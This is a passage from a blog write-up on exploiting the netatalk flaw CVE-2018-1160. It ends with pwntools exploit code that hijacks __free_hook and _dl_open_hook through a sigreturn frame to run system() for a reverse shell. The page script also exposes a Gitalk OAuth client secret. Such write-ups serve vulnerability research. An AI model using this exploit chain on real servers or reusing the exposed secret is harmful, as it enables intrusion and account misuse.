remote(ip,port)</span><br><span class="line">send2(io,rtld+<span class="number">2312</span>,cmd.ljust(<span class="number">0x5f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>改写后cmd成为system函数的参数，当程序exit后即可拿到shell</p>
<p><img src="https://s2.loli.net/2022/01/07/RBxltWq8dzsPkvf.png" alt="image-20220107184859828"></p>
<hr>
<p>最后说一下free_hook的方法，hitcon2019官方的解法，布局比较复杂，用到了两个gadget</p>
<p>覆写<code>__free_hook</code>为<code>__libc_dlopen_mode+56</code></p>
<p><img src="https://s2.loli.net/2022/01/08/SYh5a7O3oFMNnIP.png" alt="image-20220108141300714"></p>
<p>覆写<code>_dl_open_hook</code>为<code>_dl_open_hook+8</code>，<code>_dl_open_hook+8</code>为<code>fgetpos64+207</code>的这个magic_gadget</p>
<p><img src="https://s2.loli.net/2022/01/08/ltYjxMVzS8Q3FHG.png" alt="image-20220108141653927"></p>
<p><code>mov rdi,rax ; call QWORD PTR [rax+0x20]</code>，此时因为rdi指向dl_open_hook+8。我们可以将dl_open_hook+0x20处修改为setcontext+53，从而实现任意函数执行。</p>
<p>在dl_open_hook后面布置sigFrame，最终触发err时的free，调用system(cmd)执行反弹shell</p>
<p>借用大佬的布局图：</p>
<p><img src="https://gtrboy.github.io/img/netatalk/layout.png"></p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rip = system_addr</span><br><span class="line">sigframe.rdi = free_hook + <span class="number">8</span>                   <span class="comment"># cmd</span></span><br><span class="line">sigframe.rsp = free_hook                       <span class="comment"># must be a writable address, as the stack of system func</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0xF</span>, <span class="string">b&#x27;\x00&#x27;</span>)              <span class="comment"># padding</span></span><br><span class="line">payload += p64(libc_dlopen_mode_56)            <span class="comment"># __free_hook, after this rop, rax = *dl_open_hook = dl_open_hook + 8</span></span><br><span class="line">payload += cmd.ljust(<span class="number">0x2bb8</span>, <span class="string">b&#x27;\x00&#x27;</span>)          <span class="comment"># __free_hook + 8</span></span><br><span class="line">payload += p64(dl_open_hook + <span class="number">8</span>)               <span class="comment"># dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207</span></span><br><span class="line">payload += p64(fgetpos64_207)                <span class="comment"># _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(setcontext_53)             <span class="comment"># dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)[<span class="number">0x28</span>:]           <span class="comment"># now rdi = dl_open_hook + 8, thus we cut the offset from rdi to this pos</span></span><br></pre></td></tr></table></figure>



<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>转眼2022年了，水平还是太菜代码看的好累，据说这个CVE是原作者在飞机上三个小时发现的…膜拜，写完博客感觉还是有收获的</p>

        </div>

        
            <section class="post-copyright">
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://ld1ng.top/2022/01/07/CVE-2018-1160/">http://ld1ng.top/2022/01/07/CVE-2018-1160/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/12/14/Match22/">PWN记录_2022</a>
            
            
            <a class="next" rel="next" href="/2021/03/20/%E4%B8%80%E4%BB%BD%E7%A4%BC%E7%89%A9.apk/">一份礼物.apk逆向分析</a>
            
        </section>

    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
<div id="gitalk-container"></div>
<script type="text/javascript">
      var gitalk = new Gitalk({
        clientID: '458a98372426d92cae5a',
        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
        repo: 'ld1ng.github.io',
        owner: 'Ld1ng',
        admin: 'Ld1ng',
        id: md5(location.pathname),
        labels: 'Gitalk'.split(',').filter(l => l),
        perPage: 10,
        pagerDirection: 'last',
        createIssueManually: true,
        distractionFreeMode: false
      })
      gitalk.render('gitalk-container')
</script>


    </article>
</div>
            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Ld1ng🍕 © 2020 - 2023 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>